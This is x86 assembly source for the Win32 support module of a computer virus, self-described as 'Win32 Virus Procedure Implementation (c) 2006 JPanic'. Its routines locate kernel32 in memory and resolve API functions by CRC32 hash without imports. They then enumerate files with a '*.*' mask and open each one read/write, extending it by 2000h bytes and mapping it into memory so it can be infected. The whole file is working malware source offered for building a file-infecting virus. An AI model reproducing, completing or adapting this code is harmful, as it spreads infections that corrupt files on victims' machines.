;= Win32 Virus Procedure Implementation (c) 2006 JPanic ===================
;
; Provides Virus Operating System specific routines for Win32.
;
; PUBLICS:
;	Win32_Init()
;	Win32_FindFirst()
;	Win32_FindNext()
;	Win32_FindClose()
;	Win32_OpenFile()
;	Win32_Close()
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat
	
include inc\win32.inc
include inc\short.inc
include inc\stack.inc
include inc\pe.inc
include inf-pe.ash
include vheap.ash
include	crc.ash


	_WIN32PROC_ASM	EQU 	TRUE
	
;= Code Warez =============================================================
        include codeseg.ash
;= Win32_Init =============================================================
; Outputs:
;	CF on error.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_Init
Win32_Init		PROC
		
			efp = 0
                        mov     ebx,[ebp+(size stPUSHAD)+(size _VirusHeap)-7Fh]
			mov	edi,-4096
			and	ebx,edi
	@@k32_search:	add	ebx,edi
			call	IsImagePE
			jne	@@k32_search
	@@found_PE:	mov	esi,[esi.peh_DirectoryTable + (IMAGE_DIRECTORY_ENTRY_EXPORT * size PE_DirEntry)]
			add	esi,ebx
                        mov	eax,[esi.peexp_NameListPtr]
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwNamesVA = -efp
			mov	eax,[esi.peexp_OrdinalListPtr]
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwOrdsVA = -efp
			mov	eax,[esi.peexp_ProcListPtr]
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwProcsVA = -efp
                        xor	edx,edx			
			push	edx
			efp = efp + 4
			dwProcsFound = -efp
                        mov	ecx,[esi.peexp_NameCount]
                @@proc_loop:	push	ecx
			        efp = efp + 4
				mov	esi,[esp+efp+dwNamesVA]
				mov	esi,[esi+edx*4]				
				add	esi,ebx
				pusha
				efp = efp + (8 * 4)
				call	GetCRC32
				call	@@getprocofs
				        W32_IMP_LIST	<<lcrcaz !&_impname!&>, <dd crc>>
		                @@getprocofs:
			        pop	edi
				push	L K32ProcCount
				pop	ecx
				repne	scasd
                                .if     zero?
                                        mov 	esi,[esp+efp+dwOrdsVA]
					movzx	esi,wo [esi+edx*2]
					shl	esi,2
                                        add	esi,[esp+efp+dwProcsVA]
                                        mov     esi,[esi]
					add	esi,ebx
					neg     ecx                                        
					mov	dwo [Win32_Heap.LastWin32ProcAddr+(ecx * 4)],esi
					inc	dwo [esp+efp+dwProcsFound]                                                                                      
                                .endif
				popa
                                efp = efp - (8 * 4)			
				inc	edx
				pop	ecx
				efp = efp - 4
			loop 	@@proc_loop				
			cmp	dwo [esp+efp.dwProcsFound],K32ProcCount
			lea	esp,[esp+efp]
			purge efp
			ret
		
Win32_Init		ENDP

;= Win32_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindFirst
Win32_FindFirst		PROC

			; FindFirstFileA
			lea	eax,[Win32_Heap.WFF_Entry]		; lpFindFileData
			push	eax
			call	@@SkipMask				; lpFileName
			 db	'*.*',0
		@@SkipMask:
			call	dwo [Win32_Heap.dwFindFirstFileA]	; - FindFirstFileA(..)
			;
			mov	dwo [Win32_Heap.dwFindHandle],eax
	$Win32_Find:	inc	eax					; INVALID_FILE_HANDLE ?	
			jz	$ret_cf
			mov	ecx,dwo [Win32_Heap.WFF_Entry.wff_FileSizeLow]			
			.if	dwo [Win32_Heap.WFF_Entry.wff_FileSizeHigh] != 0
				xor	ecx,ecx
			.endif
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret

Win32_FindFirst		ENDP

;= Win32_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindNext
Win32_FindNext		PROC

			lea	eax,[Win32_Heap.WFF_Entry]
			push	eax				; lpFindFileData
			push	dwo [Win32_Heap.dwFindHandle]	; hFindFile
			call	dwo [Win32_Heap.dwFindNextFileA]; - FindNextFileA(..)
			dec	eax
			jmp	$Win32_Find

Win32_FindNext		ENDP

;= Win32_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindClose
Win32_FindClose		PROC

			push	dwo [Win32_Heap.dwFindHandle]	; hFindFile
			call	dwo [Win32_Heap.dwFindClose]	; - FindClose(..)
			ret
			
Win32_FindClose		ENDP

;= Win32_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_OpenFile
Win32_OpenFile		PROC

			xor	edx,edx
			lea	eax,[Win32_Heap.WFF_Entry.wff_FileName]
			xor	ecx,ecx
			; CreateFileA
			push	ecx				; hTemplateFile
			push	L fa_NORMAL			; dwFlagsAndAttributes
			push	L OPEN_EXISTING			; dwCreationDisposition
			push	ecx				; lpSecurityAttributes
			push	ecx 				; dwShareMode
			push	L (GENERIC_READ + GENERIC_WRITE); dwDesiredAccess
			push	eax				; lpFileName
			call	dwo [Win32_Heap.dwCreateFileA]	; - CreateFileA(..)
			mov	[vheap.dwFileHandle],eax
			inc	eax				; INVALID_HANDLE_VALUE ?
			jz	$ret$c
			dec	eax
			mov	ebx,2000h
			mov	esi,[vheap.dwFileSize]
			add	esi,ebx
			; FileHandle ExtendedSize
			push	eax esi
			; SetFilePointer
			push	L FILE_END			; dwMoveMethod
			push	L NULL				; lpDistanceToMoveHigh
			push	ebx				; lDistanceToMove
			push	eax				; hFile
			call	dwo [Win32_Heap.dwSetFilePointer]; - SetFilePointer(..)
			; ExtendedSize
			pop	ecx
			cmp	eax,ecx
			; FileHandle
			pop	eax
			jne	$restore_close
			; FileHandle ExtendedSize
			push	eax ecx
			; SetEndOfFile
			push	eax				; hFile
			call	dwo [Win32_Heap.dwSetEndOfFile]	; - SetEndOfFile(..)
			xchg	eax,ecx
			; ExtendedSize FileHandle
			pop	edx ebx
			jecxz	$restore_close
			xor	eax,eax
			; CreateFileMappingA
			push	eax				; lpName
			push	eax				; dwMaximumSizeLow
			push	eax				; dwMaximumSizeHigh
			push	L PAGE_READWRITE		; flProtect
			push	eax				; lpFileMappingAttributes
			push	ebx				; hFile
			call	dwo [Win32_Heap.dwCreateFileMappingA]; - CreateFileMappingA(..)
			mov	dwo [Win32_Heap.dwMapHandle],eax
			xchg	eax,ecx
			jecxz	$restore_size
			xor	edx,edx
			; MapViewOfFile
			push	edx				; dwNumberOfBytesToMap
			push	edx				; dwFileOffsetLow
			push	edx 				; dwFileOffsetHigh
			push	L FILE_MAP_ALL_ACCESS		; dwDesiredAccess
			push	ecx				; hFileMappingObject
			call	dwo [Win32_Heap.dwMapViewOfFile]; - MapViewOfFile(..)
			mov	[vheap.dwMappedFile],eax
			or	eax,eax
			jz	$restore_mapping_obj
			ret
			
Win32_OpenFile		ENDP

;= Win32_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by Win32_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	Win32_CloseFile
Win32_CloseFile		PROC
			
			push	[vheap.dwMappedFile]		; lpBaseAddress
			call	dwo [Win32_Heap.dwUnmapViewOfFile]; - UnmapViewOfFile(..)			
	$restore_mapping_obj:
			push	dwo [Win32_Heap.dwMapHandle]	; hObject
			call	dwo [Win32_Heap.dwCloseHandle]	; - CloseHandle(..)
	$restore_size:	mov	eax,[vheap.dwFileHandle]
			push	eax				; File handle (used as hFile for next SetEndOfFile()).
			push	L FILE_BEGIN			; dwMoveMethod
			push	L NULL				; lpDistancetoMoveHigh
			push	[vheap.dwFileSize]		; lDistanceToMove
			push	eax				; hFile
			call	dwo [Win32_Heap.dwSetFilePointer]; - SetFilePointer(..)
			call	dwo [Win32_Heap.dwSetEndOfFile]	; - SetEndOfFile(..)			
	$restore_close:	push	[vheap.dwFileHandle]
			call	dwo [Win32_Heap.dwCloseHandle]	; - CloseHandle(..)			
	$ret$c:		stc
			ret
			
Win32_CloseFile		ENDP
			
;==========================================================================
                        ENDS
			END
;==========================================================================
